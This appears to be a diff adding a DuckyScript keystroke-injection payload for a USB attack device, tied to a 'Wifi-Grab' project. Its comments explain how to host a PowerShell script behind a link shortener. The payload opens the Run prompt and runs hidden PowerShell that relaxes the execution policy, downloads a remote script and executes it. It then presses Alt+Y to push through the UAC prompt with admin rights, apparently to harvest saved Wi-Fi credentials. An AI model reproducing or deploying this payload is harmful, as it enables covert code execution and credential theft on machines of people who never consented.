@@ -1,0 +1,31 @@
+REM the powershell script and this payload can be found at
+REM https://github.com/axel05869/Wifi-Grab
+
+REM --------GUIDE---------
+REM download the powershell script.
+REM edit and add the required data.
+REM copy and paste all the text to notepad and save as anyname.txt.
+REM upload the text to: https://cutt.ly/WjnNPa4
+REM copy the direct download link.
+
+
+DELAY 500
+
+REM Opens the Windows Run prompt.
+GUI r
+
+REM Delays 0.2 seconds to give the Run prompt time to open.
+DELAY 200
+
+REM this command will download the text and save as d.ps1 then run
+REM if the script failed to run change the ExecPolicy to Bypass
+STRING powershell /w 1 /C Set-ExecutionPolicy RemoteSigned;wget "DOWNLOAD_LINK" -o \d.ps1;\d.ps1
+
+REM Presses Ctrl + Shift + Enter to execute the PowerShell with administrative privileges.
+CTRL-SHIFT ENTER
+
+REM Delay 0.5 seconds to give the UAC prompt time to open.
+DELAY 500
+
+REM Presses Alt + Y to bypass UAC.
+ALT y
